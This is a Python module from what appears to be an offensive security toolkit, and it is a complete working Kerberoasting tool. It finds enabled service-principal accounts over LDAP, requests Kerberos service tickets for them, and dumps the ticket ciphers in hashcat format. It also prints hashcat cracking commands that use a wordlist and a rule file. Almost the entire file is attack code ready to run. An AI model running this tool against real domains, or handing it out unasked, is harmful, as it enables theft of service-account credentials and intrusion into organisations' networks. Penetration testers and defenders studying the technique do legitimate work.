#!/usr/bin/env python3
"""
redshift_toolkit.ad.kerberoast — Kerberoasting (request TGS for service accounts).

Mechanics
---------
Any authenticated domain user can request a Kerberos service ticket (TGS-REQ)
for any servicePrincipalName. The returned TGS-REP contains a ticket
encrypted with the service account's NT hash (etype=23 RC4-HMAC) or AES key
(etype=18 AES256). Both are offline-crackable — RC4 is much faster.

Workflow
--------
1) Authenticate as a domain user (any user with a valid password).
2) LDAP-search for accounts with servicePrincipalName attribute.
3) For each, request a TGS via Kerberos TGS-REQ.
4) Extract the ticket cipher.
5) Format as hashcat -m 13100 (RC4) or -m 19700 (AES256) and write to file.

Usage
-----
  python3 -m redshift_toolkit.ad.kerberoast \\
      --dc dc01.lab.local --user alice -p 'Password1' \\
      --domain lab.local --output kerb.hashes

  # Filter to a specific SPN
  python3 -m redshift_toolkit.ad.kerberoast \\
      --dc dc01.lab.local --user alice -p 'Password1' \\
      --domain lab.local --spn 'MSSQLSvc/sql01.lab.local:1433'

Requires
--------
  pip install impacket ldap3

Author: Redshift Project — Module 18
License: MIT
"""

from __future__ import annotations

import argparse
import json
import sys
from dataclasses import asdict, dataclass, field

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


@dataclass
class KerbHash:
    user: str
    spn: str
    etype: int
    hashcat_format: str


@dataclass
class KerbRoastResult:
    spns_found: list[dict] = field(default_factory=list)
    hashes: list[KerbHash] = field(default_factory=list)
    errors: list[dict] = field(default_factory=list)


def find_spns(dc: str, user: str, password: str, domain: str) -> list[dict]:
    """LDAP-search for accounts with servicePrincipalName."""
    try:
        from ldap3 import ALL, NTLM, Connection, Server
    except ImportError:
        sys.stderr.write("error: pip install ldap3 impacket\n")
        sys.exit(2)

    s = Server(dc, get_info=ALL)
    base_dn = ",".join(f"DC={p}" for p in domain.split("."))
    c = Connection(s, user=f"{domain}\\{user}", password=password,
                   authentication=NTLM, auto_bind=True)
    c.search(base_dn,
             "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
             attributes=["sAMAccountName", "servicePrincipalName"], paged_size=500)

    out = []
    for entry in c.entries:
        sam = str(entry.sAMAccountName.value)
        for spn in entry.servicePrincipalName.values:
            out.append({"user": sam, "spn": str(spn)})
    c.unbind()
    return out


def get_tgt(dc: str, user: str, password: str, domain: str):
    """Request TGT for the user (we'll re-use it for TGS-REQs)."""
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal

    user_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, oldsk, sk = getKerberosTGT(user_principal, password, domain.upper(),
                                             unhexlify_lmhash=b'',
                                             unhexlify_nthash=b'',
                                             aesKey="", kdcHost=dc)
    return tgt, cipher, sk


def get_tgs_for_spn(spn: str, domain: str, tgt, cipher, sk, dc: str):
    """Request a TGS-REP for the given SPN."""
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import getKerberosTGS
    from impacket.krb5.types import Principal

    server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs, cipher2, oldsk, sk2 = getKerberosTGS(server_name, domain.upper(), dc, tgt, cipher, sk)
    return tgs, cipher2, sk2


def format_hashcat(spn: str, user: str, domain: str, tgs_rep_blob: bytes, etype: int) -> str:
    """Format as hashcat 13100 (RC4) or 19700 (AES256-CTS)."""
    # Extract cipher from TGS-REP
    from impacket.krb5.asn1 import TGS_REP, Ticket
    from pyasn1.codec.der import decoder

    decoded_tgs = decoder.decode(tgs_rep_blob, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(decoded_tgs["ticket"])
    enc = decoded_tgs["ticket"]["enc-part"]
    try:
        cipher = bytes(enc["cipher"])
    except TypeError:
        cipher = enc["cipher"].asOctets()

    cipher_hex = cipher.hex()

    if etype == 23:  # RC4-HMAC, hashcat 13100
        # Format: $krb5tgs$23$*user$realm$spn*$<checksum>$<rest>
        checksum = cipher_hex[:32]
        rest = cipher_hex[32:]
        return f"$krb5tgs$23$*{user}${domain.upper()}${spn}*${checksum}${rest}"
    elif etype in (17, 18):  # AES128/256, hashcat 19600/19700
        # Format: $krb5tgs$<etype>$<user>$<realm>$*<spn>*$<checksum>$<rest>
        checksum = cipher_hex[-24:]  # last 12 bytes
        rest = cipher_hex[:-24]
        return f"$krb5tgs${etype}${user}${domain.upper()}$*{spn}*${checksum}${rest}"
    else:
        return f"# unsupported etype {etype} for {user}/{spn}"


def main():
    p = argparse.ArgumentParser(
        prog="kerberoast",
        description="Request TGS for SPN-bearing accounts and dump hashcat-format hashes.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--dc", required=True, help="Domain controller")
    p.add_argument("--user", required=True, help="Authenticated domain user")
    p.add_argument("-p", "--password", required=True, help="Password")
    p.add_argument("--domain", required=True, help="Domain (e.g. lab.local)")
    p.add_argument("--spn", help="Limit to a single SPN (default: all kerberoastable)")
    p.add_argument("--output", help="Output file (one hash per line)")
    p.add_argument("--format", choices=("text", "json"), default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    on = sys.stdout.isatty() and not args.no_color
    result = KerbRoastResult()

    try:
        from impacket.krb5.asn1 import TGS_REP
        from pyasn1.codec.der import encoder
    except ImportError:
        sys.stderr.write("error: pip install impacket\n")
        sys.exit(2)

    # 1) Find SPNs (or use provided one)
    if args.spn:
        spns = [{"user": "(unknown — single SPN)", "spn": args.spn}]
    else:
        try:
            spns = find_spns(args.dc, args.user, args.password, args.domain)
        except Exception as e:
            sys.stderr.write(paint(f"[!] LDAP failed: {e}\n", RED, on))
            sys.exit(1)

    result.spns_found = spns

    if args.format == "text":
        print(paint(f"[+] Found {len(spns)} SPN(s)", GREEN, on))

    if not spns:
        sys.exit(0)

    # 2) Get TGT
    try:
        tgt, cipher, sk = get_tgt(args.dc, args.user, args.password, args.domain)
    except Exception as e:
        sys.stderr.write(paint(f"[!] TGT failed: {e}\n", RED, on))
        sys.exit(1)

    out_fh = open(args.output, "w") if args.output else None

    # 3) For each SPN, request TGS and format
    for entry in spns:
        spn = entry["spn"]
        user = entry["user"]
        try:
            tgs, c2, sk2 = get_tgs_for_spn(spn, args.domain, tgt, cipher, sk, args.dc)
            tgs_blob = encoder.encode(tgs)
            from pyasn1.codec.der import decoder
            from impacket.krb5.asn1 import TGS_REP as _TGS_REP
            decoded = decoder.decode(tgs_blob, asn1Spec=_TGS_REP())[0]
            etype = int(decoded["ticket"]["enc-part"]["etype"])
            line = format_hashcat(spn, user, args.domain, tgs_blob, etype)
            result.hashes.append(KerbHash(user=user, spn=spn, etype=etype, hashcat_format=line))
            if out_fh:
                out_fh.write(line + "\n")
            if args.format == "text":
                tag = "RC4" if etype == 23 else f"AES{ '256' if etype==18 else '128' }"
                print(paint(f"[+] {user:30s} {spn:50s} etype={etype} ({tag})", GREEN, on))
        except Exception as e:
            result.errors.append({"user": user, "spn": spn, "error": str(e)})
            if args.format == "text":
                print(paint(f"[!] {user:30s} {spn:50s} ERR: {e}", RED, on))

    if out_fh:
        out_fh.close()

    if args.format == "json":
        print(json.dumps(asdict(result), indent=2))
    else:
        print(paint(f"\n[+] {len(result.hashes)} hash(es) collected; "
                    f"{len(result.errors)} error(s)", BOLD, on))
        if args.output:
            rc4 = [h for h in result.hashes if h.etype == 23]
            aes = [h for h in result.hashes if h.etype in (17, 18)]
            if rc4:
                print(f"    Crack RC4 hashes: hashcat -m 13100 {args.output} rockyou.txt -r best64.rule")
            if aes:
                print(f"    Crack AES hashes: hashcat -m 19700 {args.output} rockyou.txt -r best64.rule")


if __name__ == "__main__":
    main()
